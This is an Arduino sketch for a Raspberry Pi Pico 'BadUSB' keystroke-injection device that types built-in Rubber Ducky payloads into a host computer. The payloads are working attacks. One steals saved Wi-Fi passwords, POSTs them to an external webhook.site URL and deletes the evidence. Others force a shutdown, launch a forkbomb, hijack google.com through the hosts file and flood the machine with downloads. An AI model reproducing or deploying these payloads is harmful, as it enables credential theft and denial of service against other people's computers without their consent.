// baddestusb.ino
// by kerochan
//
// the baddest usb, a pi pico with a tft screen, sd card slot, and 3 buttons
// runs rubber ducky scripts from sd card
// intended for use with a rpi pico, but any microcontroller should work 
// (except attiny boards, they need a special keyboard library)

// includes
#include <Keyboard.h>
#include <SPI.h>
#include <SD.h> // SD Card Library
#include <Adafruit_GFX.h>    // Core graphics library
#include <Adafruit_ST7735.h> // Hardware-specific library for ST7735

// pin definitions
// hardware pins:
// MISO - GP16
// SCK - GP18
// MOSI - GP19
#define LITE_PIN 6 // pwm tft brightness pin
#define TFT_CS 10
#define TFT_RST 9
#define TFT_DC 8
#define SD_CS 7
#define BTN0_PIN 20
#define BTN1_PIN 21
#define BTN2_PIN 22
#define LED_PIN 25

// software definitions
#define DELAY 20 // this is a very small delay added to select times where the keyboard timing is too fast for host to handle

#define SCREEN_ROTATION 2

#define KEY_MENU          0xED
#define KEY_PAUSE         0xD0
#define KEY_NUMLOCK       0xDB
#define KEY_PRINTSCREEN   0xCE
#define KEY_SCROLLLOCK    0xCF
#define KEY_SPACE         0xB4
#define KEY_BACKSPACE     0xB2

class ButtonHandler
{
    private:
        int* pins; // malloc'd array of button pins
        int* states; // states used for debouncing
        int* lastdebounce; // last state change in milliseconds
        const int DEBOUNCE = 25; // debounce milliseconds
        
    public:
        ButtonHandler( int btnpin1, int btnpin2, int btnpin3 )
        {
            int num = 3;
            this->pins = (int*) malloc( num );
            this->pins[ 0 ] = btnpin1;
            this->pins[ 1 ] = btnpin2;
            this->pins[ 2 ] = btnpin3;
            this->states = (int*) malloc( num );
            this->states[ 0 ] = HIGH;
            this->states[ 1 ] = HIGH;
            this->states[ 2 ] = HIGH;
            this->lastdebounce = (int*) malloc( num );
            this->lastdebounce[ 0 ] = 0;
            this->lastdebounce[ 1 ] = 0;
            this->lastdebounce[ 2 ] = 0;
            for( int i = 0; i < num; i ++ )
                pinMode( this->pins[ i ], INPUT_PULLUP );
        }

        // raw undebounced read
        int read( int btn )
        {
            return digitalRead( this->pins[ btn ] );
        }

        // debounced button press
        bool pressed( int btn )
        {
            int press = this->read( btn );
            if( press != this->states[ btn ] )
            {
                this->states[ btn ] = press;
                this->lastdebounce[ btn ] = millis();
            }
            return ( ( this->states[ btn ] == LOW ) && ( ( millis() - this->lastdebounce[ btn ] ) > this->DEBOUNCE ) );
        }
};

// the important globals
ButtonHandler btns = ButtonHandler( BTN0_PIN, BTN1_PIN, BTN2_PIN );
Adafruit_ST7735 tft = Adafruit_ST7735( TFT_CS, TFT_DC, TFT_RST );

// screen brightness
uint8_t brightness = 127;

// colors for drawing
uint16_t bgcolor = ST77XX_BLACK;
uint16_t textcolor = ST7735_MAGENTA;
uint16_t textcolor2 = ST77XX_RED;

// sd card status
bool sdCardFail = false;

const PROGMEM int MAIN_MENU_COUNT = 5;
const PROGMEM int MICRO_SD_INDEX = 1;
const PROGMEM String MAIN_MENU_OPTIONS[] =
{
    "PROGMEM",
    "Micro SD",
    "Colors",
    "Brightness",
    "Help!!!"
};

// main top level menu
void mainMenu()
{
    // Turn off led
    digitalWrite( LED_PIN, LOW );
    // prepare tft for printing menu text
    tft.setTextColor( textcolor );
    tft.setTextWrap( false );

    int selected = 0;
    bool exit = false;
    bool enter = true;
    do
    {
        // update menu
        tft.fillScreen( bgcolor ); // clear screen
        tft.setCursor( 0, 0 );
        tft.print( "The Baddest USB v0.7" ); // display menu label
        for( int i = 0; i < MAIN_MENU_COUNT; i ++ ) // display menu options
        {
            if( sdCardFail && i == MICRO_SD_INDEX )
                tft.setTextColor( textcolor2 );
            else if( i == MICRO_SD_INDEX + 1 )
                tft.setTextColor( textcolor );
            tft.setCursor( 8, ( i + 2 ) * 8 );
            tft.print( MAIN_MENU_OPTIONS[ i ] );
        }
        tft.setCursor( 0, ( selected + 2 ) * 8 );
        tft.print( ">" ); // print cursor

        // wait till no input if entering into menu
        if( enter )
        {
            while( btns.pressed( 0 ) || btns.pressed( 1 ) || btns.pressed( 2 ) ); // wait till no more input
            enter = false;
        }

        bool up = false;
        bool down = false;
        // wait for input
        while( !enter && !exit && !up && !down )
        {
            if( btns.pressed( 1 ) ) // execute current selection if center button pressed
                exit = true;
            while( btns.pressed( 0 ) ) // keep going in loop until press has stopped
                up = true;
            while( btns.pressed( 2 ) ) // keep going in loop until press has stopped
                down = true;
        }
        // move selected number
        if( up )
            selected --;
        else if( down )
            selected ++;
        // keep in bounds
        if( selected < 0 )
            selected = MAIN_MENU_COUNT - 1;
        else if( selected >= MAIN_MENU_COUNT )
            selected = 0;
    } 
    while( !exit ); // while not exit from menu

    // call function for selected option
    switch( selected )
    {
        case 0:
            payloadMenuPROGMEM();
        break;
        case 1:
            payloadMenuMicroSD();
        break;
        case 2:
            colorsMenu();
        break;
        case 3:
            brightnessMenu();
        break;
        case 4:
            helpScreen();
        break;
        default:

        break;
    }
}

// help screen
const PROGMEM String HELP_TEXT = 
"if you need help     "
"using this then i    "
"suggest you put this "
"down and walk away..."
"\n\n"
"or you can read the  "
"docs at:\n"
"https://github.com/\n"
"kerochan808/\n"
"baddestusb\n"
"\n"
"enjoy! :3\n"
"\n"
"oh and btw, im not\n"
"responsible for any\n"
"damage/harm or\n"
"really anything you\n"
"do with this thing.";
void helpScreen()
{
    // prepare tft for printing help screen text
    tft.setTextColor( textcolor );
    tft.setTextWrap( true );

    // display menu
    tft.fillScreen( bgcolor ); // clear screen
    tft.setCursor( 0, 0 );
    tft.print( "Help!!!" ); // display menu label
    tft.setCursor( 0, 16 );
    tft.print( HELP_TEXT );

    // wait for input to exit
    bool exit = false;
    bool enter = true;
    int selected = 0;
    while( !exit )
    {
        if( enter && !btns.pressed( 0 ) && !btns.pressed( 1 ) && !btns.pressed( 2 ) ) // wait till no input if entering into menu
            enter = false;
        if( !enter && ( btns.pressed( 0 ) || btns.pressed( 1 ) || btns.pressed( 2 ) ) ) // execute current selection if center button pressed
            exit = true;
    }
}

const PROGMEM int COLOR_MENU_COUNT = 7;
const PROGMEM String COLORS_MENU_TEXT = 
"Text:\n"
"   R:\n"
"   G:\n"
"   B:\n"
"\n"
"Background:\n"
"   R:\n"
"   G:\n"
"   B:\n"
"\n"
"   Exit";
void colorsMenu()
{
    int selected = 0;
    bool exit = false;
    bool enter = true;
    do
    {
        // display menu
        tft.setTextColor( textcolor );
        tft.setTextWrap( true );
        tft.fillScreen( bgcolor ); // clear screen
        tft.setCursor( 0, 0 );
        tft.print( "Colors! :3" ); // display menu label
        tft.setCursor( 0, 16 );
        tft.print( COLORS_MENU_TEXT );
        tft.fillRect( 30, 24, ( ( textcolor & ST77XX_RED ) >> 11 ) * 2, 8, ST77XX_RED );
        tft.fillRect( 30, 32, ( textcolor & ST77XX_GREEN ) >> 5, 8, ST77XX_GREEN );
        tft.fillRect( 30, 40, ( textcolor & ST77XX_BLUE ) * 2, 8, ST77XX_BLUE );
        tft.fillRect( 30, 64, ( ( bgcolor & ST77XX_RED ) >> 11 ) * 2, 8, ST77XX_RED );
        tft.fillRect( 30, 72, ( bgcolor & ST77XX_GREEN ) >> 5, 8, ST77XX_GREEN );
        tft.fillRect( 30, 80, ( bgcolor & ST77XX_BLUE ) * 2, 8, ST77XX_BLUE );
        uint8_t offset = 0; // offset for different option groups
        if( selected >= 6 ) offset = 3;
        else if( selected >= 3 ) offset = 2;
        tft.setCursor( 12, ( offset + selected + 3 ) * 8 );
        tft.print( ">" ); // print cursor

        // wait till no input if entering into menu
        if( enter )
        {
            while( btns.pressed( 0 ) || btns.pressed( 1 ) || btns.pressed( 2 ) ); // wait till no more input
            enter = false;
        }

        bool select = false;
        bool up = false;
        bool down = false;
        // wait for input
        while( !enter && !exit && !select && !up && !down )
        {
            if( btns.pressed( 1 ) ) // execute current selection if center button pressed
            {
                select = true;
                uint8_t textr = ( textcolor & ST77XX_RED ) >> 11;
                uint8_t textg = ( textcolor & ST77XX_GREEN ) >> 5;
                uint8_t textb = textcolor & ST77XX_BLUE;
                uint8_t bgr = ( bgcolor & ST77XX_RED ) >> 11;
                uint8_t bgg = ( bgcolor & ST77XX_GREEN ) >> 5;
                uint8_t bgb = bgcolor & ST77XX_BLUE;
                switch( selected )
                {
                    case 0:
                        textr ++;
                    break;
                    case 1:
                        textg ++;
                    break;
                    case 2:
                        textb ++;
                    break;
                    case 3:
                        bgr ++;
                    break;
                    case 4:
                        bgg ++;
                    break;
                    case 5:
                        bgb ++;
                    break;
                    case 6:
                        exit = true;
                    break;
                }
                if( textr > 31 ) textr = 0; 
                if( textg > 63 ) textg = 0; 
                if( textb > 31 ) textb = 0; 
                if( bgr > 31 ) bgr = 0; 
                if( bgg > 63 ) bgg = 0; 
                if( bgb > 31 ) bgb = 0; 
                textcolor = textr << 11 | textg << 5 | textb; 
                bgcolor = bgr << 11 | bgg << 5 | bgb; 
            }
            while( btns.pressed( 0 ) ) // keep going in loop until press has stopped
                up = true;
            while( btns.pressed( 2 ) ) // keep going in loop until press has stopped
                down = true;
        }
        // move selected number
        if( up )
            selected --;
        else if( down )
            selected ++;
        // keep in bounds
        if( selected < 0 )
            selected = COLOR_MENU_COUNT - 1;
        else if( selected >= COLOR_MENU_COUNT )
            selected = 0;
    } 
    while( !exit ); // while not exit from menu
}

// change brightness and print change to screen
void brightnessMenuChange( int amount )
{
    brightness += amount;
    uint8_t digits = 1;
    uint8_t temp = brightness;
    uint8_t centered = 0;
    while ( temp /= 10 )
        digits ++;
    switch( digits )
    {
        case 1:
            centered = 54;
        break;
        case 2:
            centered = 45;
        break;
        case 3:
            centered = 36;
        break;
        default:
        break;
    }
    tft.setCursor( centered, 100 );
    tft.setTextSize( 3 );
    tft.fillRect( 0, 100, 127, 24, bgcolor );
    tft.print( brightness );
    tft.setTextSize( 1 );
    analogWrite( LITE_PIN, brightness ); // set brightness
}

// screen brightness menu
void brightnessMenu()
{
    // prepare tft for printing screen brightness text
    tft.setTextColor( textcolor );
    tft.setTextWrap( true );

    // display menu
    tft.fillScreen( bgcolor ); // clear screen
    tft.setCursor( 0, 0 );
    tft.print( "Screen Brightness" ); // display menu label
    tft.setCursor( 0, 16 );
    tft.print( "Change Brightness:\nUp/Down Buttons\n\nExit:\nMiddle Button\n\n\n\n     Brightness:" );
    brightnessMenuChange( 0 ); // print current brightness

    // wait for input to exit
    bool exit = false;
    bool enter = true;
    while( !exit )
    {
        if( enter && !btns.pressed( 0 ) && !btns.pressed( 1 ) && !btns.pressed( 2 ) ) // wait till no input if entering into menu
            enter = false;
        if( !enter && ( btns.pressed( 0 ) ) ) // turn up brightness
            brightnessMenuChange( 1 );
        if( !enter && ( btns.pressed( 1 ) ) ) // exit
            exit = true;
        if( !enter && ( btns.pressed( 2 ) ) ) // turn down brightness
             brightnessMenuChange( -1 );
        delay( 50 ); // small delay to keep brightness speed slower
    }
}

// PROGMEM payloads variables
const PROGMEM int PROGMEM_PAYLOAD_COUNT = 10;
const PROGMEM String PROGMEM_PAYLOAD_NAMES[] = 
{ 
    "Power Down Now", 
    "Timed Power Down", 
    "Meow Forkbomb",
    "Wi-Fi Password Thief",
    "Rotate Screen",
    "Google Who?",
    "Fake Windows 98",
    "Rick Roll",
    "Cat GIF Bomb",
    "Delay Scroll Test"
};
const PROGMEM String PROGMEM_PAYLOADS[] =
{
    // Power Down Now
    "GUI r\n"
    "DELAY 500\n"
    "STRING cmd\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING shutdown /f /s\n"
    "ENTER\n",
    // Timed Power Down
    "GUI r\n"
    "DELAY 500\n"
    "STRING cmd\n"
    "ENTER\n"
    "DELAY 1500\n"
    "shutdown /f /s /t 3600\n"
    "ENTER\n",
    // Meow Forkbomb
    "GUI r\n"
    "DELAY 500\n"
    "STRING cmd\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING ( echo @echo off && echo :meow && echo echo meow! :3 && echo start %temp%/meow.bat && echo goto meow ) > %temp%/meow.bat\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING %temp%/meow.bat\n"
    "ENTER\n",
    // Wi-Fi Password Thief
    "GUI r\n"
    "DELAY 500\n"
    "STRING cmd\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING netsh wlan export profile key=clear\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS\n"
    "ENTER\n"
    "STRING powershell Invoke-WebRequest -Uri https://webhook.site/69277a67-6fdc-457d-8c90-f3f9cfe1836a -Method POST -InFile Wi-Fi-PASS\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING del Wi-* /s /f /q\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING exit\n"
    "ENTER\n",
    // Rotate Screen
    "CONTROL ESCAPE\n"
    "DELAY 500\n"
    "STRING display settings\n"
    "DELAY 500\n"
    "ENTER\n"
    "DELAY 2000\n"
    "TAB\n"
    "DELAY 200\n"
    "TAB\n"
    "DELAY 200\n"
    "TAB\n"
    "DELAY 200\n"
    "TAB\n"
    "DELAY 200\n"
    "TAB\n"
    "DELAY 200\n"
    "ENTER\n"
    "DELAY 200\n"
    "DOWNARROW\n"
    "DOWNARROW\n"
    "DELAY 100\n"
    "ENTER\n"
    "DELAY 200\n"
    "TAB\n"
    "DELAY 100\n"
    "ENTER\n"
    "DELAY 1000\n"
    "ALT F4\n"
    "DELAY 500\n",
    // Google Who?
    "ESCAPE\n"
    "CONTROL ESCAPE\n"
    "DELAY 500\n"
    "STRING cmd\n"
    "DELAY 500\n"
    "MENU\n"
    "DELAY 500\n"
    "DOWNARROW\n"
    "ENTER\n"
    "DELAY 1000\n"
    "LEFTARROW\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING cd C:/Windows/System32/drivers/etc/\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING echo 127.0.0.1 www.google.com>>hosts\n"
    "ENTER\n"
    "DELAY 500\n"
    "STRING ipconfig /flushdns\n"
    "ENTER\n"
    "DELAY 500\n"
    "ALT SPACE\n"
    "STRING c\n",
    // Fake Windows 98
    "GUI r\n"
    "DELAY 500\n"
    "STRING https://zhangsixiang.gitee.io/windowsupdateprankbyfediafedia/windows98/index.html\n"
    "ENTER\n"
    "DELAY 2000\n"
    "F11\n"
    "DELAY 500\n",
    // Rick Roll
    "GUI r\n"
    "DELAY 50\n"
    "STRING powershell.exe\n"
    "DELAY 100\n"
    "ENTER\n"
    "DELAY 50\n"
    "STRING Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}\n"
    "DELAY 150\n"
    "ENTER\n"
    "DELAY 50\n"
    "STRING Set-Speaker -Volume 50\n"
    "DELAY 100\n"
    "ENTER\n"
    "DELAY 200\n"
    "GUI r\n"
    "DELAY 50\n"
    "STRING https:\\www.youtube.com/watch?v=dQw4w9WgXcQ\n"
    "DELAY 100\n"
    "ENTER\n"
    "DELAY 10000\n"
    "STRING F\n",
    // Cat GIF Bomb
    "GUI r\n"
    "DELAY 500\n"
    "STRING powershell\n"
    "ENTER\n"
    "DELAY 1500\n"
    "STRING For( $i=1; $i -lt 1000000; $i++ ) { Invoke-WebRequest \"https://thecatapi.com/api/images/get?format=src&type=gif\" -O \"cat$i.gif\"; start cat$i.gif }\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING exit\n"
    "ENTER\n",
    // Delay Scroll Test
    "DELAY 100                                 ;\n"
    "DELAY 200\n"
    "DELAY 300\n"
    "DELAY 400\n"
    "DELAY 500\n"
    "DELAY 600\n"
    "DELAY 700\n"
    "DELAY 800\n"
    "DELAY 900\n"
    "DELAY 1000\n"
    "DELAY 1100\n"
    "DELAY 1200\n"
    "DELAY 1300\n"
    "DELAY 1400\n"
    "DELAY 1500\n"
    "DELAY 1600\n"
    "DELAY 1700\n"
    "DELAY 1800                               ;\n"
    "DELAY 1900\n"
    "DELAY 2000\n"
    "DELAY 2100                                 ;\n"
    "DELAY 2200\n"
    "DELAY 2300\n"
    "DELAY 2400\n"
    "DELAY 2500\n"
};

// menu for PROGMEM payloads because i cant find my free microsd card from micro center ;-;
void payloadMenuPROGMEM()
{
    // Turn off led
    digitalWrite( LED_PIN, LOW );

    // prepare tft for printing menu text
    tft.setTextColor( textcolor );
    tft.setTextWrap( false );

    int selected = 0;
    bool exit = false;
    bool enter = true;
    do
    {
        // update menu
        tft.fillScreen( bgcolor ); // clear screen
        tft.setCursor( 0, 0 );
        tft.print( "PROGMEM Payloads" ); // display menu label
        for( int i = 0; i < PROGMEM_PAYLOAD_COUNT; i ++ ) // display payload names
        {
            tft.setCursor( 8, ( i + 2 ) * 8 );
            tft.print( PROGMEM_PAYLOAD_NAMES[ i ] );
        }
        tft.setCursor( 8, ( PROGMEM_PAYLOAD_COUNT + 2 ) * 8 );
        tft.print( "back" );
        tft.setCursor( 0, ( selected + 2 ) * 8 );
        tft.print( ">" ); // print cursor

        // wait till no input if entering into menu
        if( enter )
        {
            while( btns.pressed( 0 ) || btns.pressed( 1 ) || btns.pressed( 2 ) ); // wait till no more input
            enter = false;
        }

        bool up = false;
        bool down = false;
        // wait for input
        while( !enter && !exit && !up && !down )
        {
            if( btns.pressed( 1 ) ) // execute current selection if center button pressed
                exit = true;
            while( btns.pressed( 0 ) ) // keep going in loop until press has stopped
                up = true;
            while( btns.pressed( 2 ) ) // keep going in loop until press has stopped
                down = true;
        }
        // move selected number
        if( up )
            selected --;
        else if( down )
            selected ++;
        // keep in bounds
        if( selected < 0 )
            selected = PROGMEM_PAYLOAD_COUNT;
        else if( selected > PROGMEM_PAYLOAD_COUNT )
            selected = 0;
    } 
    while( !exit ); // while not exit from menu
    if( selected != PROGMEM_PAYLOAD_COUNT ) // if not "back" option
        executePayload( PROGMEM_PAYLOADS[ selected ] );
}

// Micro SD card payload browser menu
void payloadMenuMicroSD()
{

}

// takes an newline sperated string of duckyscript commands
// prints commands to tft as they are executed
void executePayload( String payload )
{
    // prepare tft for printing payload text
    tft.setTextColor( textcolor );
    tft.setTextWrap( true );

    // execute payload
    String line = "";
    int lineoffset = 0; // line offset caused by text wrapping/overflow
    String display = ""; // display string buffer
    while( payload.length() > 1 ) // while there is still payload to execute
    {
        digitalWrite( LED_PIN, !digitalRead( LED_PIN ) ); // switch led state
        tft.fillScreen( bgcolor ); // clear screen

        // split payload
        int payloadnewlineindex = payload.indexOf( "\n" );
        String payloadline = payload.substring( 0, payloadnewlineindex ); // get current payload line
        payload = payload.substring( payloadnewlineindex + 1 ); // chop off currently executing payload line

        // manage display buffer
        display += payloadline + "\n";
        lineoffset += 1 + floor( payloadline.length() / 21 );
        while( lineoffset >= 21 )
        {
            display = display.substring( min( display.indexOf( "\n" ) + 1, 21 ) );
            lineoffset --;
        }
        
        // display display buffer
        tft.setCursor( 0, 0 );
        tft.print( display );
        
        processLine( payloadline );  // Process script line by reading command and payload
        //Keyboard.releaseAll(); // release all keys

        while( btns.pressed( 1 ) ) {} // center button pause
    }

    // display that script is done
    delay( DELAY ); // delay a little bit for screen
    display += "done!";
    lineoffset ++;
    while( lineoffset >= 21 )
    {   
        display = display.substring( min( display.indexOf( "\n" ) + 1, 21 ) ); // get rid of first line
        lineoffset --;
    }
    tft.fillScreen( bgcolor ); // clear screen
    tft.setCursor( 0, 0 );
    tft.print( display );
}


// adapted from
// https://github.com/Creased/arducky/blob/master/arducky_femto.ino

void processLine( String line ) 
{
    /*
     * Process Ducky Script according to the official documentation (see https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript).
     *
     * (1) Commands without payload:
     *  - ENTER
     *  - MENU <=> APP
     *  - DOWNARROW <=> DOWN
     *  - LEFTARROW <=> LEFT
     *  - RIGHTARROW <=> RIGHT
     *  - UPARROW <=> UP
     *  - BREAK <=> PAUSE
     *  - CAPSLOCK
     *  - DELETE
     *  - END
     *  - ESC <=> ESCAPE
     *  - HOME
     *  - INSERT
     *  - NUMLOCK
     *  - PAGEUP
     *  - PAGEDOWN
     *  - PRINTSCREEN
     *  - SCROLLLOCK
     *  - SPACE
     *  - TAB
     *  - REPLAY (global commands aren't implemented)
     *
     * (2) Commands with payload:
     *  - DEFAULT_DELAY <=> DEFAULTDELAY (global commands aren't implemented.)
     *  - DELAY (+int)
     *  - STRING (+string)
     *  - GUI <=> WINDOWS (+char)
     *  - SHIFT (+char or key)
     *  - ALT (+char or key)
     *  - CTRL <=> CONTROL (+char or key)
     *  - REM (+string)
     *
     */

    int space = line.indexOf( ' ' );  // Find the first 'space' that'll be used to separate the payload from the command
    String command = "";
    String payload = "";

    if( space == -1 ) // There is no space -> (1)
    {  
        if( line == "ENTER" ||
            line == "MENU" || line == "APP" ||
            line == "DOWNARROW" || line == "DOWN" ||
            line == "LEFTARROW" || line == "LEFT" ||
            line == "RIGHTARROW" || line == "RIGHT" ||
            line == "UPARROW" || line == "UP" ||
            line == "BREAK" || line == "PAUSE" ||
            line == "CAPSLOCK" ||
            line == "DELETE" ||
            line == "END" ||
            line == "ESC" || line == "ESCAPE" ||
            line == "HOME" ||
            line == "INSERT" ||
            line == "NUMLOCK" ||
            line == "PAGEUP" ||
            line == "PAGEDOWN" ||
            line == "PRINTSCREEN" ||
            line == "SCROLLLOCK" ||
            line == "SPACE" ||
            line == "TAB" ||
            line == "F1" || line == "F2" || line == "F3" ||
            line == "F4" || line == "F5" || line == "F6" ||
            line == "F7" || line == "F8" || line == "F9" ||
            line == "F10" || line == "F11" || line == "F12" ) 
        {
            command = line;
        }
    } 
    else // Has a space -> (2)
    {  
        command = line.substring( 0, space );   // Get chars in line from start to space position
        payload = line.substring( space + 1 );  // Get chars in line from after space position to EOL

        if( command == "DELAY" ||
            command == "STRING" ||
            command == "GUI" || command == "WINDOWS" ||
            command == "SHIFT" ||
            command == "ALT" ||
            command == "CTRL" || command == "CONTROL" ||
            command == "REM" ) {} 
        else 
        {
            // Invalid command
            command = "";
            payload = "";
         }
    }

    if( payload == "" && command != "" )                        // Command from (1)
        processCommand(command);                                // Process command
    else if( command == "DELAY" )                               // Delay before the next commande
        delay( (int) payload.toInt() );                         // Convert payload to integer and make pause for 'payload' time
    else if( command == "STRING" )                              // String processing
        Keyboard.print( payload );                              // Type-in the payload
    else if( command == "REM" ) {}                              // Comment
    else if( command != "" )                                    // Command from (2)
    {
        String remaining = line;                                // Prepare commands to run
        while( remaining.length() > 0 )                         // For command in remaining commands
        {                        
            int space = remaining.indexOf( ' ' );               // Find the first 'space' that'll be used to separate commands
            if( space != -1 )                                   // If this isn't the last command
            {
                processCommand( remaining.substring( 0, space ) ); // Process command
                remaining = remaining.substring( space + 1 );   // Pop command from remaining commands
            } 
            else                                                // If this is the last command
            {
                processCommand( remaining );                    // Pop command from remaining commands
                remaining = "";                                 // Clear commands (end of loop)
            }
            delay( DELAY );                                 // the pico is so fast that this is the only way itll work
        }
    } 
    else {} // Invalid command

    delay( DELAY ); // pico goes so fast that it wont release keys if theres no delay here

    Keyboard.releaseAll();
}

void processCommand( String command ) 
{
    /*
     * Process commands by pressing corresponding key
     * (see https://www.arduino.cc/en/Reference/KeyboardModifiers or
     *      http://www.usb.org/developers/hidpage/Hut1_12v2.pdf#page=53)
     */

    if( command.length() == 1 )      // Process key (used for example for WIN L command)
    {     
        char c = (char) command[0];  // Convert string (1-char length) to char
        Keyboard.press(c);           // Press the key on keyboard
    } 
    else if( command == "ENTER" )
        Keyboard.press( KEY_RETURN );
    else if( command == "MENU" || command == "APP" )
        Keyboard.press( KEY_MENU );
    else if (command == "DOWNARROW" || command == "DOWN" )
        Keyboard.press( KEY_DOWN_ARROW );
    else if (command == "LEFTARROW" || command == "LEFT" )
        Keyboard.press( KEY_LEFT_ARROW );
    else if( command == "RIGHTARROW" || command == "RIGHT" )
        Keyboard.press( KEY_RIGHT_ARROW );
    else if( command == "UPARROW" || command == "UP" )
        Keyboard.press( KEY_UP_ARROW );
    else if( command == "BREAK" || command == "PAUSE" )
        Keyboard.press( KEY_PAUSE );
    else if( command == "CAPSLOCK" )
        Keyboard.press( KEY_CAPS_LOCK );
    else if( command == "DELETE" || command == "DEL" )
        Keyboard.press( KEY_DELETE );
    else if( command == "END" )
        Keyboard.press( KEY_END );
    else if( command == "ESC" || command == "ESCAPE" )
        Keyboard.press( KEY_ESC );
    else if( command == "HOME" )
        Keyboard.press( KEY_HOME );
    else if( command == "INSERT" )
        Keyboard.press( KEY_INSERT );
    else if( command == "NUMLOCK" )
        Keyboard.press( KEY_NUMLOCK );
    else if( command == "PAGEUP" )
        Keyboard.press( KEY_PAGE_UP );
    else if( command == "PAGEDOWN" )
        Keyboard.press( KEY_PAGE_DOWN );
    else if( command == "PRINTSCREEN" )
        Keyboard.press( KEY_PRINTSCREEN );
    else if( command == "SCROLLLOCK" )
        Keyboard.press( KEY_SCROLLLOCK );
    else if( command == "SPACE" )
        Keyboard.press( KEY_SPACE );
    else if( command == "BACKSPACE" )
        Keyboard.press( KEY_BACKSPACE );
    else if( command == "TAB" )
        Keyboard.press( KEY_TAB );
    else if( command == "GUI" || command == "WINDOWS" )
        Keyboard.press( KEY_LEFT_GUI );
    else if( command == "SHIFT" )
        Keyboard.press( KEY_RIGHT_SHIFT );
    else if( command == "ALT" )
        Keyboard.press( KEY_LEFT_ALT );
    else if( command == "CTRL" || command == "CONTROL" )
        Keyboard.press( KEY_LEFT_CTRL );
    else if( command == "F1" || command == "FUNCTION1" )
        Keyboard.press( KEY_F1 );
    else if( command == "F2" || command == "FUNCTION2" )
        Keyboard.press( KEY_F2 );
    else if( command == "F3" || command == "FUNCTION3" )
        Keyboard.press( KEY_F3 );
    else if( command == "F4" || command == "FUNCTION4" )
        Keyboard.press( KEY_F4 );
    else if( command == "F5" || command == "FUNCTION5" )
        Keyboard.press( KEY_F5 );
    else if( command == "F6" || command == "FUNCTION6" )
        Keyboard.press( KEY_F6 );
    else if( command == "F7" || command == "FUNCTION7" )
        Keyboard.press( KEY_F7 );
    else if( command == "F8" || command == "FUNCTION8" )
        Keyboard.press( KEY_F8 );
    else if( command == "F9" || command == "FUNCTION9" )
        Keyboard.press( KEY_F9 );
    else if( command == "F10" || command == "FUNCTION10" )
        Keyboard.press( KEY_F10 );
    else if( command == "F11" || command == "FUNCTION11" )
        Keyboard.press( KEY_F11 );
    else if( command == "F12" || command == "FUNCTION12" )
        Keyboard.press( KEY_F12 );
}

void setup() {
    // init output pins
    pinMode( LED_PIN, OUTPUT );
    pinMode( LITE_PIN, OUTPUT );
    analogWrite( LITE_PIN, brightness );

    // Small delay for screen and keyboard
    delay( 250 );

    // init tft screen
    tft.initR( INITR_BLACKTAB );
    tft.setRotation( SCREEN_ROTATION );
    tft.fillScreen( bgcolor ); // clear screen

    // init SD card
    pinMode( SD_CS, OUTPUT );
    sdCardFail = !SD.begin( SD_CS );

    // Initialize control over keyboard
    Keyboard.begin();

    // another small delay for screen and keyboard
    delay( 500 );

    while( true )
        mainMenu(); // forever loop progmem payload menu
}

void loop() 
{
    // nothing to see here
}
